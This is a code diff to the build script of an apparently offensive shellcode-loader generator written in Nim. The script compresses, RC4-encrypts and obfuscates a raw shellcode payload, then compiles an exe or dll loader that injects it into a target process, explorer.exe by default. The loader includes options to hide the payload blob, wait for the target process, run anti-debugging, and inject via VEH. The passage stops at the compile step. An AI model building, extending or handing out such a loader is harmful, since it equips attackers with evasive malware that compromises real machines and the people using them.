@@ -1,21 +1,20 @@
 import RC4
 import osproc
 import argparse
-import ptr_math
 import strformat
 import supersnappy
-import winim/inc/[rpc, windef]
 from std/base64 import encode
 
 
 # YOU HAVE TO HAVE A TOOL BANNER
-const pichichiBanner = """
+const banner = """
 """
 
 # Declare arguments
 var shellcodePath: string
 var injectionMethod: string
 var processName: string
+var waitForProcess: bool
 var outFormat: string
 var outDllExportName: string  
 var isSplit: bool
@@ -23,31 +22,29 @@ var sleepSeconds: string
 var antiDebugg: string
 var key: string
 var isVeh: bool
-var isDebug: bool
 var isEncrypted: bool
 var payload: string
-
 
 # Define compiler args
 var compileExeCmd = "nim compile --app:console"         # exe format
 var compileDllCmd = "nim compile --app:lib --nomain"    # dll format
 var compileExePath = " Loader/main.nim"                 # for source exe
 var compileDllPath = " Loader/dll.nim"                  # for source dll
-var compileOutExe = " -o:out.exe"                       # for compiled exe
-var compileOutDll = " -o:out.dll"                       # for compiled dll
+var compileOutExe = " -o:PartyLoader.exe"               # for compiled exe
+var compileOutDll = " -o:PartyLoader.dll"               # for compiled dll
 var compileFlags = " --cpu=amd64"                       # for windows 64 bit
 compileFlags.add " -d:release -d:strip --opt:none"      # for minimal size   # --opt:size casuing runtime erros here!
 compileFlags.add " --passL:-Wl,--dynamicbase"           # for relocation table (needed for loaders)
 compileFlags.add " --benchmarkVM:on"                    # for NimProtect key randomization
 compileFlags.add " --maxLoopIterationsVM:100000000"     # for RC4'ing big files
 
-
 when isMainModule:
     # Define arguments
     var p = newParser:
-        help(pichichiBanner)
+        help(banner)
         arg("raw-shellcode-file", help="Shellcode file to load")
         option("-n", "--process-name", help="Process name to inject (default: explorer.exe)", default=some("explorer.exe"))
+        flag("-w", "--wait-for-process", help="Wait for the target process to start (default: exit if target process not found)")
         option("-f", "--format", help="Loader format", choices = @["exe", "dll"], default=some("exe"))
         option("-e", "--export", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
         flag("-p", "--split", help="Split and hide the payload blob in loader (takes long to compile!)")
@@ -55,12 +52,12 @@ when isMainModule:
         option("-g", "--anti-debug", help="Action to perform upon debugger detection", choices = @["none", "die", "troll"], default=some("none"))
         option("-k", "--key", help="RC4 key to [en/de]crypt the payload (supplied as a command line argument to the loader)", default=some(""))
         flag("-v", "--veh", help="Injection will occur within VEH")
-        flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
     # Parse arguments
     try:
         var opts = p.parse()
         shellcodePath = opts.raw_shellcode_file
-        processName = opts.process_name      
+        processName = opts.process_name
+        waitForProcess = opts.wait_for_process      
         outFormat = opts.format
         outDllExportName = opts.export
         isSplit = opts.split
@@ -68,23 +65,18 @@ when isMainModule:
         antiDebugg = opts.anti_debug
         key = opts.key
         isVeh = opts.veh
-        isDebug = opts.debug
     except ShortCircuit as err:
         if err.flag == "argparse_help":
             echo err.help
             quit(1)
     except UsageError:
-        echo pichichiBanner
+        echo banner
         echo "[-] " & getCurrentExceptionMsg()
         echo "[i] Use -h / --help\n"
         quit(1)
 
-    # Validate exe
+    # rEAD & Compress & encode shellcode
     var shellcodeStr = readFile(shellcodePath)
-    var shellcodeBytes = @(shellcodeStr.toOpenArrayByte(0, shellcodeStr.high))
-    var shellcodeBytesPtr = addr shellcodeBytes[0]
-
-    # Compress & encode exe payload
     var compressedShellcode = compress(shellcodeStr)
 
     # (Encrypt and) Encode payload if key supplied
@@ -103,11 +95,11 @@ when isMainModule:
     else:
         payloadLine = fmt"""var payload* = protectString("{payload}")"""
     var paramsToLoader = fmt"""
-import os
 import nimprotect
 
 {payloadLine}
 var processName* = protectString("{processName}")
+var waitForProcess* = {waitForProcess}
 var dllExportName* = protectString("{outDllExportName}") 
 var antiDebugAction* = protectString("{antiDebugg}")
 var sleepSeconds* = {sleepSeconds}
@@ -116,10 +108,6 @@ var isEncrypted* = {isEncrypted}
     """
     writeFile(paramsPath, paramsToLoader)
         
-    # Change to debug if needed
-    if isDebug:
-        compileFlags = compileFlags.replace("-d:release ", "")
-
     # Compile
     var compileCmd: string
     if outFormat == "exe":
